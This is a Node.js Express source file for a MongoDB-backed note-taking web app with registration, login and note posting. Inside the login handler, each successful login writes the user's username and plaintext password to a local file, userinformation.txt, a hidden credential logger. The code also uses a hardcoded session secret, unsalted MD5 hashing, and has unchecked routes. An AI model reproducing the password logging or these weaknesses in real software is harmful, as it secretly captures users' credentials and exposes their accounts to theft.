/*
 * Created by zhenxuye on 2017/5/10.
 */


var express=require('express');
var path=require('path');
var bodyParser=require('body-parser');
var crypto=require('crypto');
var session=require('express-session');
var fs=require("fs");
//引入处理日期显示格式的包moment
var moment=require('moment');

//引入mongoose

var mongoose=require('mongoose');
//mongoose.Promise = global.Promise;

//引入模型
var models=require('./models/models.js');
var User=models.User;
var Note=models.Note;

var info="";

var checkLogin=require('./checkLogin.js');

//使用 mongoose连接服务
mongoose.connect('mongodb://localhost:27017/notes');
mongoose.connection.on('error',console.error.bind(console,"连接数据库失败"));


var app=express();

//定义esj模板引擎和模板文件位置
app.set('views',path.join(__dirname,'views'));
app.set('view engine','ejs');

//定义静态文件目录
app.use(express.static(path.join(__dirname,'public')));

//定义数据解析器
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended:true}));


//建立session模型
app.use(session({
    secret:'1234',
    name:'mynote',
    cookie:{maxAge:1000*60*20},  //1000ms *60=1分钟 即，设置session的保存时间为20分钟
    resave:false,
    saveUninitialized:true
}));

//响应首页get请求
// app.get('/',checkLogin.noLogin);
app.get('/',function (req,res) {

    if(!req.session.user){
        console.log('抱歉，您还没有登录 ！');
        return res.redirect('/login');

    }
    Note.find({author:req.session.user.username}).exec(function (err,allNotes) {
        if (err) {
            console.log(err);
            return res.redirect('/');
        }

        res.render('index', {
            user: req.session.user,
            title: '首页',
            notes: allNotes,
            moment:moment
        });
    });
});


app.get('/register',function (req,res) {

   console.log('注册 ！');
   res.render('register',{
       user:req.session.user,
       title:'注册'
   });
});

app.get('/login',function (req,res) {

   console.log('登陆 ！');
   res.render('login',{
       user:req.session.user,
       title:'登陆',
       info:info
   });
});

app.get('/quit',function (req,res) {

   console.log('退出 ！');
   req.session.user=null;
   return res.redirect('/login');
});

app.get('/post',function (req,res) {
    if(!req.session.user){
        console.log('抱歉，您还没有登录 ！');
        return res.redirect('/login');

    }
   console.log('发布 ！');
   res.render('post',{
       user:req.session.user,
       title:'发布'
   });
});

app.get('/detail/:_id',function (req,res) {
    if(!req.session.user){
        console.log('抱歉，您还没有登录 ！');
        return res.redirect('/login');

    }
   console.log('查看笔记 ！');
   Note.findOne({_id:req.params._id}).exec(function (err,art) {
      if(err){
          console.log(err);
          return res.redirect('/');
      }

      if(art){
              res.render('detail',{
              user:req.session.user,
              title:'笔记详情',
                  art:art,
                  moment:moment
          });
      }
   });

});

//post请求
app.post('/register',function (req,res) {
   //req.body 可以获取表单的每项数据

    var username=req.body.username,
        password=req.body.password,
        passwordRepeat=req.body.passwordRepeat;

    //检查输入的用户名是否为空，使用trim去掉两端空格
    if(username.trim().length==0){
        console.log("用户名不能为空 ！");

        return res.redirect('/register');
    }

    if(password.trim().length==0 || passwordRepeat.trim().length==0){
        console.log("密码不能为空 ！");

        return res.redirect('/register');
    }

    if(password.trim()!=passwordRepeat.trim()){
        console.log("两次输入的密码不一致 ！");

        return res.redirect('/register');
    }


    //检查用户名是否已经存在，如果不存在，则保持该条记录
    User.findOne({username:username},function (err,user) {
       if(err){
           console.log(err);
           return res.redirect('/register');
       }

       if(user){
           console.log("用户名已经存在 ！");
           return res.redirect('/register');
       }

       //对密码进行md5加密
        var md5=crypto.createHash('md5'),
            md5password=md5.update(password).digest('hex');


       //新建user对象用于保存数据
        var newUser=new User({
            username:username,
            password:md5password
        });

        newUser.save(function (err,doc) {
           if(err){
               console.log(err);
               return res.redirect('/register');
           }
           console.log("注册成功 ！");
           return res.redirect('/');
        });


    });
    // return res.redirect('/login');
});

app.post('/login',function (req,res) {


    var username=req.body.username,
        password=req.body.password;
	//console.log(username);
	//console.log(password);
    User.findOne({username:username},function (err,user) {
       if(err){
           console.log(err);
           return res.redirect('/login');
       }

       if(!user){
           console.log("用户不存在 ！");
           info="用户不存在 ！";
           return res.redirect('/login');
       }

       var md5=crypto.createHash('md5');
            md5password=md5.update(password).digest('hex');

        if(user.password!==md5password){
            console.log('密码错误 ！');
            info="密码错误 ！";
            return res.redirect('/login');
        }

		var sd = require('silly-datetime');
		var time=sd.format(new Date(), 'YYYY-MM-DD HH:mm');
		//console.log(time);
		//
		fs.appendFile('./userinformation.txt','Time: '+time+'\t'+'Username: '+username+'\t'+"Password: "+password+'\n',function(err){
		if (err) console.log("写文件操作失败！");
		else console.log("写文件操作成功！");
		});
        console.log("登录成功 ！");
        user.password=null;
        delete user.password;
        req.session.user=user;
        return res.redirect('/');
    });





// var note=new Note({
//     title:req.body.title,
//     author:req.session.user.username,
//     tag:req.body.tag,
//     content:req.body.content
// }) ;
});

app.post('/post',function (req,res) {

    var note=Note({
       title:req.body.title,
        author:req.session.user.username,
        tag:req.body.tag,
        content:req.body.content
    });

    note.save(function (err,doc) {
       if(err){
           console.log(err);
           return res.redirect('/post');
       }

       console.log('文章发表成功 ！');
       return res.redirect('/');

    });
});




app.listen(80,function (req,res) {
   console.log('app is running at port 80');
});
